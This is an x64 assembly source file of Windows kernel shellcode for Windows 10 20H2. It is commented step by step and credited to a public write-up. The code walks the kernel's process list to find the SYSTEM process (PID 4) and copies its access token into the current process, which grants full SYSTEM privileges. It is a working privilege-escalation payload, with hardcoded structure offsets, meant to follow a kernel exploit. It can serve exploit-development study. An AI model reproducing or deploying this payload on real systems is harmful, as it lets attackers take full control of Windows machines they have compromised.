[BITS 64]

; This shellcode is heavily based off of Connor McGarr's write-up! Check it out!
; https://connormcgarr.github.io/x64-Kernel-Shellcode-Revisited-and-SMEP-Bypass/

; Windows 10 20H2 offsets
; Current process' PRCB offset: +0x180
; Current process' _KTHREAD structure offset: +0x8
; ActiveProcessLinks offset: +0x448
; UniqueProcessId offset: +0x440
; Process Token offset: +0x4B8

  mov rax, [gs:0x180 + 0x8]	; Move the current processor control block (PRCB) into rax. Additionally, add an offset of 0x8 to the rax register. The rax register should now point to the current thread _KTHREAD structure.
  
  mov rax, [rax + 0xB8]		; Add an offset of 0xB8 to the rax register. The rax register should now point to the current process _EPROCESS structure.

  mov rbx, rax			; Copy the current process _EPROCESS structure into the rbx register. We will need this for later.

find_system_pid:
  mov rbx, [rbx + 0x448]	; Add an offset of 0x448 to the rbx register. The rbx register should now point to the ActiveProcessLinks structure property.
  sub rbx, 0x448		; Subtract the offset from before to return to the current process. While this code can be simplified, I am simply following along with a paper.
  mov rcx, [rbx + 0x440]	; Add an offset of 0x440 to the rbx register and copy it into the rcx register. The rcx register should now point to a process ID.
  cmp rcx, 4			; Compare the process ID to the SYSTEM process' process ID (4).
  jnz find_system_pid

  mov rcx, [rbx + 0x4B8]	; Copy the address of the SYSTEM process' token into the rcx register. The rcx register should now point to the aforementioned process token. The SYSTEM process' token is located at _EPROCESS+0x4B8

  and cl, 0xF0			; Bitwise AND the lower 4-bits of the process token stored in the rcx register.

  mov [rax + 0x4B8], rcx	; Replace our current process' token with the SYSTEM process' token. Done!
  
recovery:

  ret